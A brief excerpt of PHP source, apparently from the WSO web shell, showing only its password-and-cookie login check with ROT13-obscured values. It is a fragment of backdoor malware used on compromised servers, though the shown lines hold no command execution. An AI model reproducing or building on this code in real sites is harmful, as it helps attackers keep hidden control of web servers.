...
if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (str_rot13($_POST['pass']) == $auth_pass))
        WSOsetcookie(str_rot13($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[str_rot13($_SERVER['HTTP_HOST'])]) || ($_COOKIE[str_rot13($_SERVER['HTTP_HOST'])] != $auth_pass))
        wsoLogin();
}
